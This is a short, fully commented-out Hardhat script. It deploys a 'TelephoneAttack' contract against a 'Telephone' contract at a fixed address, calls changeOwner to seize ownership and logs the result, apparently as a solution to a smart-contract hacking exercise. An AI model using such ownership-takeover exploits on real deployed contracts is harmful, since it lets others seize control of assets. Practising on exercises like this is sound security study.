
// const hre = require("hardhat");
// require('dotenv').config();

// async function main() {
//   const TelephoneAttack = await hre.ethers.getContractFactory("TelephoneAttack");
//   const telephoneAttack = await TelephoneAttack.deploy();
//   const telephone = await hre.ethers.getContractAt("Telephone", "0x4D06933c94e99aAE61abcAB8fa035b51392854c1");
//   await telephoneAttack.deployed();
//   console.log("Telephone attack deployed to:", telephoneAttack.address);
//   await telephoneAttack.changeOwner();
//   console.log(await telephone.owner());
// }

// main()
//   .then(() => process.exit(0))
//   .catch(error => {
//     console.error(error);
//     process.exit(1);
//   });
